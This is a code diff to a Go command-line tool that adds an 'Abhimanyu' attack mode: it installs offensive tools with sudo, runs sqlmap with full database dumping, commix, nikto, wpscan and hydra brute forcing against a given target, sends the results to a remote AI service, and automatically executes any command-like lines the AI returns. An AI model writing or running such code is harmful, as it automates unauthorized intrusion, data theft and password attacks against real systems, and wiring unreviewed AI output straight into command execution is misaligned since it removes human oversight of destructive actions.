@@ -596,22 +596,209 @@ func runAbhimanyu(target, vulnType string) {
 	fmt.Println(lipgloss.NewStyle().Foreground(lipgloss.Color("#333333")).Render("  " + strings.Repeat("─", 60)))
 	fmt.Println()
 
-	payload := map[string]interface{}{
-		"target":      target,
-		"vuln_type":   vulnType,
-		"target_type": "domain",
+	// ── Phase 1: Auto-install missing exploit tools ───────────────────────
+	fmt.Println(lipgloss.NewStyle().Foreground(cyan).Render("  ⟳ Checking exploit tools..."))
+	exploitTools := []struct{ name, install string }{
+		{"sqlmap", "sudo apt install sqlmap -y"},
+		{"commix", "sudo apt install commix -y"},
+		{"msfconsole", "sudo apt install metasploit-framework -y"},
+		{"searchsploit", "sudo apt install exploitdb -y"},
+		{"hydra", "sudo apt install hydra -y"},
+		{"john", "sudo apt install john -y"},
+		{"hashcat", "sudo apt install hashcat -y"},
+		{"wpscan", "sudo apt install wpscan -y"},
+		{"nikto", "sudo apt install nikto -y"},
+		{"crunch", "sudo apt install crunch -y"},
+	}
+	for _, t := range exploitTools {
+		if _, err := exec.LookPath(t.name); err != nil {
+			fmt.Println(lipgloss.NewStyle().Foreground(purple).Render(fmt.Sprintf("  ⟳ %-14s installing...", t.name)))
+			parts := strings.Fields(t.install)
+			cmd := exec.Command(parts[0], parts[1:]...)
+			cmd.Run()
+		}
 	}
 
-	fmt.Println(lipgloss.NewStyle().Foreground(cyan).Render("  ⟳ Sending to Abhimanyu exploit engine..."))
+	// ── Phase 2: Run exploit tools based on vuln type ────────────────────
+	findings := make(map[string]string)
+	lhost := getLocalIP()
+
+	runExploit := func(name string, args []string, timeout int) string {
+		fmt.Println(lipgloss.NewStyle().Foreground(purple).Render(fmt.Sprintf("  ⟳ %-14s attacking...", name)))
+		cmd := exec.Command(name, args...)
+		var out strings.Builder
+		cmd.Stdout = &out
+		cmd.Stderr = &out
+
+		done := make(chan error, 1)
+		go func() { done <- cmd.Run() }()
+		select {
+		case <-done:
+		case <-time.After(time.Duration(timeout) * time.Second):
+			if cmd.Process != nil {
+				cmd.Process.Kill()
+			}
+		}
+		result := out.String()
+		if result != "" {
+			fmt.Println(lipgloss.NewStyle().Foreground(green).Render(fmt.Sprintf("  ✓ %-14s done", name)))
+			findings[name] = result
+		} else {
+			fmt.Println(lipgloss.NewStyle().Foreground(dim).Render(fmt.Sprintf("  - %-14s no output", name)))
+		}
+		return result
+	}
+
+	u := "https://" + target
+	if strings.HasPrefix(target, "http") {
+		u = target
+	}
+
+	// SQLi — sqlmap full blast
+	if vulnType == "all" || vulnType == "sqli" {
+		runExploit("sqlmap", []string{
+			"-u", u,
+			"--batch",           // no user input
+			"--level", "5",      // max level
+			"--risk", "3",       // max risk
+			"--dbs",             // enumerate databases
+			"--tables",          // enumerate tables
+			"--dump-all",        // dump everything
+			"--forms",           // test forms
+			"--crawl", "3",      // crawl depth 3
+			"--threads", "10",
+			"--random-agent",
+			"--tamper", "space2comment,between,randomcase",
+			"-o",                // optimize
+		}, 3600)
+	}
+
+	// Command injection — commix
+	if vulnType == "all" || vulnType == "cmdi" || vulnType == "rce" {
+		runExploit("commix", []string{
+			"--url", u,
+			"--batch",
+			"--level", "3",
+			"--all",             // test all parameters
+			"--technique", "all",
+			"--random-agent",
+		}, 1800)
+	}
+
+	// Web vuln scan — nikto full
+	if vulnType == "all" || vulnType == "web" {
+		runExploit("nikto", []string{
+			"-h", u,
+			"-Tuning", "1234567890abcde",
+			"-ssl",
+			"-mutate", "1,2,3,4,5,6",
+			"-maxtime", "1800",
+			"-nointeractive",
+		}, 1800)
+	}
+
+	// WordPress — wpscan
+	if vulnType == "all" || vulnType == "wp" {
+		runExploit("wpscan", []string{
+			"--url", u,
+			"--enumerate", "ap,at,cb,dbe,u,m",
+			"--plugins-detection", "aggressive",
+			"--random-user-agent",
+			"--force",
+		}, 1800)
+	}
+
+	// Searchsploit — find exploits for detected services
+	if vulnType == "all" || vulnType == "cve" {
+		runExploit("searchsploit", []string{
+			"--json",
+			target,
+		}, 60)
+	}
+
+	// Hydra — brute force common services
+	if vulnType == "all" || vulnType == "auth" || vulnType == "brute" {
+		for _, service := range []string{"ssh", "ftp", "http-post-form"} {
+			if _, err := exec.LookPath("hydra"); err == nil {
+				fmt.Println(lipgloss.NewStyle().Foreground(purple).Render(fmt.Sprintf("  ⟳ hydra %-10s brute forcing...", service)))
+				var hydraArgs []string
+				switch service {
+				case "ssh":
+					hydraArgs = []string{
+						"-L", "/usr/share/wordlists/metasploit/unix_users.txt",
+						"-P", "/usr/share/wordlists/rockyou.txt",
+						"-t", "16", "-f", "-V",
+						target, "ssh",
+					}
+				case "ftp":
+					hydraArgs = []string{
+						"-L", "/usr/share/wordlists/metasploit/unix_users.txt",
+						"-P", "/usr/share/wordlists/rockyou.txt",
+						"-t", "16", "-f",
+						target, "ftp",
+					}
+				}
+				if len(hydraArgs) > 0 {
+					runExploit("hydra", hydraArgs, 1800)
+				}
+			}
+		}
+	}
+
+	// ── Phase 3: Send all findings to AI for exploit analysis ─────────────
+	fmt.Println()
+	fmt.Println(lipgloss.NewStyle().Foreground(cyan).Render("  ⟳ Sending to Abhimanyu AI for exploit analysis..."))
+
+	payload := map[string]interface{}{
+		"target":    target,
+		"vuln_type": vulnType,
+		"lhost":     lhost,
+		"findings":  findings,
+	}
+
 	analysis, err := api.SendAbhimanyu(target, vulnType, payload)
 	if err != nil {
-		printError("Abhimanyu mode failed: " + err.Error())
+		printError("Abhimanyu AI failed: " + err.Error())
+		// Print raw findings anyway
+		fmt.Println(lipgloss.NewStyle().Foreground(yellow).Render("  Raw findings:"))
+		for tool, output := range findings {
+			fmt.Printf("\n=== %s ===\n%s\n", strings.ToUpper(tool), output[:min(len(output), 2000)])
+		}
 		return
 	}
 
 	clean := utils.StripMarkdown(analysis)
 	printResult("⚔️  ABHIMANYU Exploit Report → "+target, clean)
 	_ = storage.AddEntry("/abhimanyu "+target, clean)
+
+	// ── Phase 4: Auto-execute AI-suggested commands ───────────────────────
+	fmt.Println()
+	fmt.Println(lipgloss.NewStyle().Bold(true).Foreground(red).Render("  ⚔️  Auto-executing exploit commands from AI analysis..."))
+	// Extract and run commands from AI output
+	for _, line := range strings.Split(clean, "\n") {
+		line = strings.TrimSpace(line)
+		// Execute lines that look like commands (start with known tools)
+		for _, tool := range []string{"sqlmap", "commix", "msfconsole", "hydra", "nikto", "wpscan", "searchsploit", "curl", "nmap"} {
+			if strings.HasPrefix(line, tool+" ") {
+				fmt.Println(lipgloss.NewStyle().Foreground(yellow).Render("  ⚡ Executing: " + line))
+				parts := strings.Fields(line)
+				if len(parts) > 0 {
+					cmd := exec.Command(parts[0], parts[1:]...)
+					cmd.Stdout = os.Stdout
+					cmd.Stderr = os.Stderr
+					cmd.Run()
+				}
+				break
+			}
+		}
+	}
+}
+
+func min(a, b int) int {
+	if a < b {
+		return a
+	}
+	return b
 }
 
 // installPythonPipTool installs a Python tool via pip3.
